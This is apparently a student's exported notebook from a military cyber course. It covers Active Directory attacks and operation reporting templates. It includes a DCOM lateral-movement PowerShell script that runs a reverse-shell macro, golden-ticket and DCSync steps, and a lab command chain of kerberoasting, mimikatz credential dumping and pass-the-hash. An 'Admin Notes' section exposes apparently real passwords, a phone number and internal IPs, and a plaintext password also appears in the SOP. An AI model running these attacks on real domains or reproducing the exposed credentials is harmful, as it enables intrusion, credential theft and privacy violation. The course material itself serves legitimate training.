alt="images/1178-2.png" /></a><br />From previous enumeration we determined that the owner of the IIS server is yee\tripp:Passw0rd. We are going to need to get the hash for that password.<br />A87F3A337D73085C45F9416BE5787D86<br /><a href=""><img src="images/1178-3.png" alt="images/1178-3.png" /></a><br /><br />The ticket is now running in memory. Becasue application request and service authentication (kerberos steps 5 and 6) do not involve the KDC, authentication to an application as an admin can be done! This is most commonly used against Microsoft SQL servers and can result in RCE.</div><div class='page'><h1 class='title level-4'>DCOM</h1><br/>Where COM is the standard that allows microsoft process&#39;s to talk to each other, DCOM is the same thing but for communication over the network.<br />Outlook, PowerPoint, and Excel have DCOM objects that allow lateral movment.<br />In summary:<br />Create an instance of the System.Activator class (which enables the ability to call the “Run” method via DCOM)<br />Make an Excel document and embed a macro that will run your shellcode.<br />Use the .NET command to move the file to the target machine.<br />Activate the “System” account by giving it a Desktop directory.<br />Useing the “Open” method and the “Workbooks” object we can run the Excel document.<br />Useing DCOM run the macro and catch the rev shell in a nc listener.</div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>Running as Tire from UserBox, we will make a macro calling nc.exe in an excel document, use DCOM to move the file to bossman and then execute the macro getting a reverse shell on the kali box.<br />Create a macro that when executed will give you a reverse shell.<br /><a href=""><img src="images/1179-1.png" alt="images/1179-1.png" /></a><br />Run this these commands/this script from userbox, pointing at Bossman.<br /><div class="codebox"><div class="codebox">$com&nbsp;=&nbsp;[activator]::CreateInstance([type]::GetTypeFromProgId(&quot;Excel.Application&quot;,&quot;192.168.40.129&quot;))<br /><br />$LocalPath&nbsp;=&nbsp;&quot;C:\Users\tire\Desktop\Macro.xlsm&quot;&nbsp;<br /><br />$RemotePath&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Macro.xlsm&quot;&nbsp;<br /><br />[System.IO.File]::Copy($LocalPath,&nbsp;$RemotePath,&nbsp;$True)&nbsp;<br /><br />$Path&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;&nbsp;<br /><br />$temp&nbsp;=&nbsp;[system.io.directory]::createDirectory($Path)&nbsp;<br /><br />$Workbook&nbsp;=&nbsp;$com.Workbooks.Open(&quot;C:\Macro.xlsm&quot;)<br /><br />$com.Run(&quot;Yeeter&quot;)</div></div><br /><br /><a href=""><img src="images/1179-2.png" alt="images/1179-2.png" /></a><br /><br /><a href=""><img src="images/1179-3.png" alt="images/1179-3.png" /></a><br /><br />Note- You may need to add a firewall rule depending on the networks GPO to create the COM object.<br />New-NetFirewallRule -DisplayName &quot;Allow DCOM&quot; -Direction Inbound -Action Allow -Enabled True -RemoteAddress 192.168.40.133<br />Remove-NetFirewallRule -DisplayName “Allow DCOM”</div><div class='page'><h1 class='title level-3'>Persistance</h1><br/></div><div class='page'><h1 class='title level-4'>DC Sync</h1><br/>In a domain with mutliple domain controllers, there are constant queries via the IDL_DRSGetNCChanges API to keep all of th domain controllers on the same page and updated. When this API is used to query an account, the machine does not need to be verified to be a DC, only the SID needs to have the appropriate privileges. In short, a domain admin will be able to query the DC directly, aquiring the NTLM hash of user on the domain. </div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>We are going to log into Bossman as tire and ask for a DCSync for the Tripp account. Then take that hash and dump the password.<br /><a href=""><img src="images/1182-1.png" alt="images/1182-1.png" /></a><br /><a href=""><img src="images/1182-2.png" alt="images/1182-2.png" /></a></div><div class='page'><h1 class='title level-4'>Golden Ticket</h1><br/>Remember! When a user logs in, they are submitting a request for a TGT. When the user recieves the TGT it is incrypted with the hash of the password for the krbtgt account. If we are able to get our hands on that password hash, we will be able to create our own TGT&#39;s, for users that exist or don&#39;t exist, and give them whatever privileges we desire!<br />The loss of the krbtgt hash is particularly devistating becasue there is no built in way to change the the krbtgt password. It can not be done without substancial downtime of the entire domain.</div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>We are going to log onto the dc and aquire the hash of the KRBTGT. We will then use that hash to create a “golden ticket” on bossman and psexec into the DC with only a user account.<br /><a href=""><img src="images/1181-1.png" alt="images/1181-1.png" /></a><br />301f73ccb16c24dddc2bd3a3dff7aa43<br /><br />This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br />First we get the domain SID (all but the last tach and four charchters), then demonstrate that we do not have the ability to psexec to DC01.<br /><a href=""><img src="images/1181-2.png" alt="images/1181-2.png" /></a><br />Useing mimikatz we create a golden ticket and use the /ptt argument to put it in memory.<br /><a href=""><img src="images/1181-3.png" alt="images/1181-3.png" /></a><br />In a new shell we attempt to psexec to DC01 again, only this time with success!<br /><a href=""><img src="images/1181-4.png" alt="images/1181-4.png" /></a><br /><br />Note - If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows. <br /><br /><a href=""><img src="images/1181-5.png" alt="images/1181-5.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Others</h1><br/>Grab the NTDS.dit file - A copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.<br />Run mimikatz on the DC dumping the hash of every account.<br />Skeleton keys aren&#39;t technically persistance, but they are pretty neat, allowing you to make a second password for an account with out effecting the original. Skeleton keys only run in memory, therfor a reboot of the machine would remove the skeleton key. </div><div class='page'><h1 class='title level-3'>Exercise answers</h1><br/></div><div class='page'><h1 class='title level-4'>Net.exe</h1><br/></div><div class='page'><h1 class='title level-5'>1. Domain users</h1><br/><a href=""><img src="images/1195-1.png" alt="images/1195-1.png" /></a></div><div class='page'><h1 class='title level-5'>2. Domain admins</h1><br/><a href=""><img src="images/1196-1.png" alt="images/1196-1.png" /></a></div><div class='page'><h1 class='title level-4'>Powershell</h1><br/></div><div class='page'><h1 class='title level-5'>1. Nesting</h1><br/><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(ObjectClass=*)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()<br />foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;if&nbsp;($obj.properties.name&nbsp;-like&nbsp;&#39;*marforcyber*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$root&nbsp;=&nbsp;$obj<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$grouplist&nbsp;=&nbsp;@(&#39;root&nbsp;&#39;+$root.properties.name)}}<br />$memberofcount&nbsp;=&nbsp;1<br />while&nbsp;($memberofcount&nbsp;-ge&nbsp;1){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.properties.memberof&nbsp;-like&nbsp;$root.properties.distinguishedname){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.Properties.samaccounttype&nbsp;-like&nbsp;&#39;*268435456*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$grouplist&nbsp;+=&nbsp;&#39;nested&nbsp;group&nbsp;of&nbsp;&#39;+&nbsp;$obj.Properties.memberof&nbsp;+&nbsp;&#39;&nbsp;=&nbsp;&#39;&nbsp;+&nbsp;$obj.Properties.name}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{$grouplist&nbsp;+=&nbsp;&#39;nested&nbsp;user&nbsp;of&nbsp;&#39;+&nbsp;$obj.Properties.memberof&nbsp;+&nbsp;&#39;&nbsp;=&nbsp;&#39;&nbsp;+&nbsp;$obj.Properties.name}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$memberofcount&nbsp;=&nbsp;$obj.Properties.member.Count<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$root&nbsp;=&nbsp;$obj<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break}}}<br />$grouplist<br /></div></div><br /><a href=""><img src="images/1198-1.png" alt="images/1198-1.png" /></a><br />...or a better way done with the active directory module  (the script can be found on DC01).<br /><a href=""><img src="images/1198-2.png" alt="images/1198-2.png" /></a><br /><a href="https://gallery.technet.microsoft.com/scriptcenter/Get-nested-group-15f725f2">https://gallery.technet.microsoft.com/scriptcenter/Get-nested-group-15f725f2</a><br /><br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(ObjectClass=user)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()<br />foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.Properties.userprincipalname&nbsp;-like&nbsp;&#39;*kvothe*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$obj.Properties.manager<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}}<br />&nbsp;&nbsp;&nbsp;&nbsp;<br /></div></div><br /><a href=""><img src="images/1198-3.png" alt="images/1198-3.png" /></a></div><div class='page'><h1 class='title level-5'>asdf</h1><br/></div><div class='page'><h1 class='title level-5'>ATME</h1><br/></div><div class='page'><h1 class='title level-5'>ATME</h1><br/></div><div class='page'><h1 class='title level-5'>2. Kvothe's Manager</h1><br/></div><div class='page'><h1 class='title level-4'>Get-Netsession</h1><br/><a href=""><img src="images/1200-1.png" alt="images/1200-1.png" /></a><br /><br /><br />Trick question! I have no idea! In the example above, I am logged in as tire (domain admin) and I am able to see more from squid (domain user) who is running in a shell via the runas command.</div><div class='page'><h1 class='title level-4'>Service Principal Names</h1><br/><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;serviceprincipalname=*&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){$obj.Properties.serviceprincipalname}</div></div><br /><a href=""><img src="images/1201-1.png" alt="images/1201-1.png" /></a></div><div class='page'><h1 class='title level-3'>Lab</h1><br/>GOAL=Get the NTLM hash of krbtgt while starting with only squid:yeetcannon<br /><br />nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;yee.wtf&#39;,userdb=/opt/wordlists/names.txt 192.168.40.128<br />GetUserSPNs.py -request yee.wtf/squid<br />copy paste ticket -&gt; krb5tgs.out<br />john ./krb5tgs.out<br />rdesktop -u Tripp -d yee.wtf -p Passw0rd 192.168.40.131<br />in elevated command prompt:<br />	net users /domain<br />	net groups /domain <br />	net groups /domain &quot;domain admins&quot;<br />	whoami /groups<br />	whoami /priv<br />	C:\tools\mimikatz.exe<br />	privilege::debug<br />	sekurlsa::logonpasswords<br />	take JBettis NTLM hash 90ce085b7102581debbd0cbe1f3f384b <br />	kerberos::purge<br />	kerberos::list<br />	sekurlsa::pth /user:JBettis /ntlm:90CE085B7102581DEBBD0CBE1F3F384B /domain:yee.wtf<br />	lsadump::dcsync /user:krbtgt<br /><br />Why didn&#39;t I use psexec?????</div><div class='page'><h1 class='title level-4'>Fun psexec nugget</h1><br/>When you spawn a session with psexec.exe (sysinternals tool), that session will run in a medium integrity context. Therefore even if the user has the privilege to write to the ADMIN$ drive of another machine, the token of the proccess the user is running in will not allow it.<br />Psexec.py (Impacket tool) spawns it&#39;s process&#39;s as system (that is becasue it writes to any share it can access, creates a service pointing to the .exe in the share it can write to then executes that service whcih defaults to being run as system). Althought the token is fine, if you would attempt to use psxec.exe (sysinternals tool) from that psexec.py session it would not fail but instead hang. Why? Becasue psexec.py communicates back via a TCP port where as psexec.exe communicates via named pipes and there is some kind of misshap with the stdin,out,err relationship. <br /></div><div class='page'><h1 class='title level-2'>BOC</h1><br/>ssh kali@ip -X<br /><br />cherrtytree &amp;<br />tilix &amp;<br />qterminal &amp;<br /></div><div class='page'><h1 class='title level-3'>SOP</h1><br/>read Daily Read<br />read Mission plan...<br />See If Mission Plan IP&#39;s are covered by NSDB<br />Script Tunnels and Shorthand Gameplan<br />Setup Tmux in tilix<br />Setup Notes in qterminal<br />Confrim IP&#39;s With MC<br /><br /><br />Operate...<br /><br /><br />Make sure you Told MC about All Disco&#39;s<br />Debrief the MC<br />archive<br />close notes<br />Create NSDB<br />close NSDB<br />exit (to close term screen) on each terminal)<br />cd ..<br />tar -cvf schmid_20-04-21_MM1.tar   schmid_20-04-21_MM1<br />scp schmid_20-04-21_MM1.tar student14@10.50.24.17:~<br />password14<br />verify reception<br /><br /><br /><br /><br /><br />on Kali (through x11)<br />date=20-05-21<br />miss=Eval08<br />targs=8<br />dm=$date\_$miss<br />mkdir /root/schmid_$dm<br />cd /root/schmid_$dm<br />cp /root/NotesTemplate /root/schmid_$dm/notes_$date<br />cp /root/NSDBTemplate /root/schmid_$dm/NSDB_$date<br />touch Survey_0.0.0.0<br /><br />tmux new-session -s Targets -d -n KaliTarget<br />tmux send-keys -t Targets:0  cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />for i in $(seq 1 $targs); do<br />    tmux new-window -t Targets:$i -n T$i -d<br />    tmux send-keys -t Targets:$i cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />done<br /><br />tmux new-session -s Masters -d -n KaliMaster<br />tmux send-keys -t Masters:0  cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />for i in $(seq 1 $targs); do<br />    tmux new-window -t Masters:$i -n T$i -d<br />    tmux send-keys -t Masters:$i  cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter<br />done<br /><br /><br /><br /><br /><br /><br />cd ..<br />tar -cvf schmid_$date\_$miss.tar schmid_$date\_$miss<br />scp schmid_$date\_$miss.tar student14@10.50.24.17:~<br />password14<br />verify reception<br /></div><div class='page'><h1 class='title level-4'>Admin Notes</h1><br/><a href="https://register.cybbh.space/v2/?OVERRIDE">https://register.cybbh.space/v2/?OVERRIDE</a><br /><a href="https://ipa.cybbh.space/ipa/ui/#/e/user/details/ccschmi">https://ipa.cybbh.space/ipa/ui/#/e/user/details/ccschmi</a><br /><a href="https://git.cybbh.space/users/sign_in">https://git.cybbh.space/users/sign_in</a><br /><a href="https://vta.cybbh.space/horizon/auth/login/">https://vta.cybbh.space/horizon/auth/login/</a><br /><br /><h3>ccschmi</h3><br /><h3>2Bk);}_ZqG&gt;%1I$rFb_Tfq</h3><br /><h3>12qwaszx!@QWASZX3edc</h3><br />ipa<br /><h3>UnitedStatesArmyCyberSchool</h3><br /><br /><h3>Dudes number: 404 951 7044</h3><br /><br /><h3>Frank IP: 10.50.30.20, 192.168.0.99</h3><br /><h3>Kali: 10.50.21.220</h3><br /></div><div class='page'><h1 class='title level-3'>Reporting</h1><br/>SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# and IP<br />Name:  <br />Version:  <br />Primary registry key / Config &amp; Installation location on *nix:<br /><br />### NSDB extras ###<br />Installation folder:  <br />Location of logs:<br />Timestamp of Discovery:<br />Timestamp of all associated log files:<br />Cloud based?  Y or N<br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  <br />*****End of Report*****<br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Abnormal Logging Report*****<br />Target: T# and IP<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config file:  <br />Remote hostname or IP:  <br />Network connections:<br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Hash:<br />File type of malware &amp; supporting files:<br />Associated logs:<br />Location and lines of persistence:  <br />Malware file and support files full paths:<br />Open/established network connections:<br />Identifiable text:<br />Any modules loaded by malware:<br />Describe purpose/activities/capabilities:<br />Recommendation on what to do:<br />*****End of Report*****<br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T1 and IP<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config:  <br />Remote hostname or IP:  <br />Network connections:  <br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Unusual config options:<br />Hostname or IP of where logs are sent:<br />Established or listening network connections:<br />Description:  <br />Recommendation:  <br />*****End of Report*****<br />Why is it abnormal?<br /><br /><br /><br /><br />PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />Target:<br />Username:<br />Access Method:<br />Access Time:<br />Activity:<br />Running files/executables:  <br />Network Connections:<br />Description:<br />Recommendation:<br />*****End of Report*****<br /><br /> SELINUX<br /><br />    • Best to cut and paste setstatus<br />    • enforcing or permissive<br />    • version<br /><br />*****SELinux Report*****<br />Target:<br />Enforcing or Permissive:  <br />Version:<br />Command Output:  <br />*****End of Report****<br /><br />II.  Op Notes<br /><br />1.  Mission start / end time<br />2.  Connect / Disconnect Time for each Target<br />3.  Start and end timestamps of &quot;Upon Connection&quot; and &quot;Before Disconnect&quot; vetting command sections<br />4.  Full output of vetting commands is not required<br /><br />III.  Collection reports to Analyst<br /><br />1.  Completion of all analyst tasks (survey, collect, scanning)<br />2.  Hash all collected files on target and ops station.<br />3.  Survey Notes<br />    • Start and end timestamps of &quot;Analyst Survey Commands&quot;<br />    • Students will create a seperate file for every device they survey with the full output of the survey commands. Naming convention will be &quot;Survey_&lt;IP_Address&gt;&quot;.<br /><br />IV.  Post-op<br /><br />1.  All files go into OPSDIR.<br />2.  Submit DEBRIEF to MC.<br />      – Description plus ADMIN USER REPORT plus one sentence per target<br />3.  tar -cvf OPSDIR.tar OPSDIR/<br />4.  scp OPSDIR.tar student3@10.50.24.17:~<br /><br />DON’T FORGET TO REPORT ADMIN USERS IN DEBRIEF<br /><br />My TEMPLATE--&gt;<br />***** MC DEBRIEF *****<br />Operator: Student03<br />Operation: Mystic Marvel 10<br />MC: MC1/2<br />Analyst: Analyst1/2                                                                                                                     <br /><br />Description:<br />Successfully completed collection, survey and T10 effect requirements.<br /><br />T1:  Submitted rsyslog, maldet security product, and SELinux report on T1 and conducted scan of network.  Redirected T2<br />T2:  Submitted rsyslog report and redirected T3 using IPtables.<br />T3:  Submitted rsyslog and SElinux report.  Collected /etc/passwd and /etc/shadow.<br />T4:  Submitted sfk keylogger malware and privileged user report. Collected user info and installed app info.  Redirect to T5 by netsh rules.<br />T5:  Submitted beacon.ps1 malware and privileged user report.  Collected .dll files.  Redirected to T6 via netsh rules.<br />T6:  Submitted Reptile rootkit and rsyslog reports.  Did survey.  Collected files from /etc.  Redirect to T7.<br />T7:  Submitted  rsyslog report. Completed survey.  T10 Effect: Deleted student1 from T7.<br />***** END OF REPORT <br /><br />GUIDELINES TEMPLATE--&gt;<br /><br />********** MC DEBRIEF *****<br />Operator: YOURNAME<br />Operation: OPNAME<br />MC: MC1/2<br />Analyst: Analyst<br />Description: &lt;two-three sentence description of operation&gt;<br /> <br />EXAMPLE:<br />Operator: SSG(P) Ryan Jay McGuinn<br />Operation: DryRun1<br />MC: Sergeant First Class Chandler II<br />Analyst: SFC Jonathan Cortez<br />Description: Goal of operation was to collect email from EMAIL3. Mission was overall successful. Operator redirected through EXT_RTR to ADMIN1 to EMAIL3. Admin was logged into T2 running a security product. ClamAV was found on EMAIL3, MC provided guidance and email was collected.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Abnormal Logging</h1><br/>ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T1 and IP<br />Time:<br />Name:  <br />PID:  <br />PPID:  <br />User:  <br />Location of config:  <br />Remote hostname or IP:  <br />Network connections:  <br />Description:<br /><br />### NSDB extras ###<br />Process options:<br />Unusual config options:<br />Recommendation:  <br />Why is it abnormal?:<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T8 and IP 192.186.169.142<br />Time: 2021/05/20 - 10:51<br />Name:  rsyslog <br />PID:  2236<br />PPID:  1<br />User:  root<br />Location of config:  /etc/rsyslog.conf /etc/rsyslog<br />Remote hostname or IP:  remote-host<br />Network connections: 192.186.169.201:514<br />Description:mail, news.none would be forwarded to remote-host (192.186.169.201).<br /><br />### NSDB extras ###<br />Process options: rsyslog -n<br />Unusual config options: Remote logging. <br />Recommendation:  CM<br />Why is it abnormal?: Remote logging is not default.<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T5 and IP 192.168.117.105<br />Time:2021/05/04 - 10:45<br />Name:  wireshark<br />PID:  4664<br />PPID:  1<br />User:  administrator<br />Location of config:  STANDARD = %APPDATA%\Wireshark . In this case it does not exist.<br />Remote hostname or IP:  na<br />Network connections:  listening on external interface (probably)<br />Description: Administrator is running wireshark. Presumtivly sniffing traffic.<br /><br />### NSDB extras ###<br />Process options: na<br />Unusual config options: na<br />Recommendation:  CM<br />*****End of Report*****<br />Why is it abnormal?: Wireshark is not installed by default and often must be run by admin.<br /><br /><br /><br /><br /><br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T2 and IP 10.20.169.10<br />Time:2021/05/18 - 08:47<br />Name:  LogFusion 4.6<br />PID:  2244<br />PPID:  176<br />User:  administrator<br />Location of config:  &quot;C:\Program Files (x86)\LogFusion\LogFusion.exe.config&quot;<br />Remote hostname or IP:  na<br />Network connections:  in order for logfusion to remote log, DisplayFusion would need to be running. It is not currently. NA<br />Description: LogFusion is a Real-Time Log Monitoring tool that an admin is currently running.<br /><br />### NSDB extras ###<br />Process options:na<br />Unusual config options:na<br />Recommendation:  CM<br />Why is it abnormal?: Real-Time Log Monitoring is not default.<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T4 and IP 192.186.169.133<br />Time: 2021/05/20 - 09:14<br />Name: process accounting  <br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config: /var/pacct/*  <br />Remote hostname or IP:  na<br />Network connections:  na<br />Description:Process accouning<br /><br />### NSDB extras ###<br />Process options: na<br />Unusual config options:na<br />Recommendation:  CM<br />Why is it abnormal?: Process accouning is not a default logging mechanism.<br />*****End of Report*****<br /><br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T5 and IP 192.186.169.201<br />Time:2021/05/20 - 09:41<br />Name:  tcpdump<br />PID:  22579<br />PPID:  1121<br />User:  root<br />Location of config: na <br />Remote hostname or IP: na  <br />Network connections:  listening on lo<br />Description: tcpdump is logging traffic from lo to /var/log/tcpdump.pcap<br />### NSDB extras ###<br />Process options: tcpdump -i lo -w /var/log/tcpdump.pcap  <br />Unusual config options: na<br />Recommendation:  CM<br />Why is it abnormal?: TCPDump is not a default running process.<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />ABNORMAL LOGGING<br />MC Report requires all MC elements.  <br /><br />*****Abnormal Logging Report*****<br />Target:  T3 and IP 10.20.169.239<br />Time:2021/05/20 - 08:59<br />Name:  ip monitor link<br />PID:  2034<br />PPID:  2033<br />User:  root<br />Location of config:   /opt/vyatta/sbin/vyos-intfwatchd<br />Remote hostname or IP:  na<br />Network connections:  na<br />Description: Ip monitor link is a real time monitoring service.<br /><br />### NSDB extras ###<br />Process options: /opt/vyatta/sbin/vyos-intfwatchd<br />Unusual config options: na<br />Recommendation:  CM<br />Why is it abnormal?: ip monitor link is not default.<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />*****Abnormal Logging Report*****<br />Target:  T6 and IP 10.123.169.35<br />Time: 2021/05/11 - 12:29<br />Name: postdrop  <br />PID:  26539<br />PPID:  26535<br />User:  root<br />Location of config: na  <br />Remote hostname or IP: na  <br />Network connections:  na<br />Description: postdrop command creates a file in the maildrop directory and copies its standard input to the file<br /><br />### NSDB extras ###<br />Process options:/usr/sbin/postdrop -r<br />Unusual config options: na<br />Recommendation:  CM<br />Why is it abnormal?: postdrop is not needed (but may be default) when running sendmail.<br />*****End of Report*****<br /><br /><br /><br /><br /><br />*****Abnormal Logging Report*****<br />Target:  T:LP and IP 10.50.28.172<br />Time:2021/05/13 - 08:49<br />Name:  gvfsd-fuse<br />PID:  1102<br />PPID:  1022<br />User:  root<br />Location of config:   /etc/fstab<br />Remote hostname or IP:  na<br />Network connections:  na<br />Description: gvfsd-fuse loggs button clicks and actions in x11 applications. (logging to file is abnormal).<br /><br />### NSDB extras ###<br />Process options:/usr/lib/gvfs/gvfsd-fuse /run/user/0/gvfs -f -o big_writes<br />Unusual config options: -o big_writes<br />Recommendation:  CM<br />Why is it abnormal?: 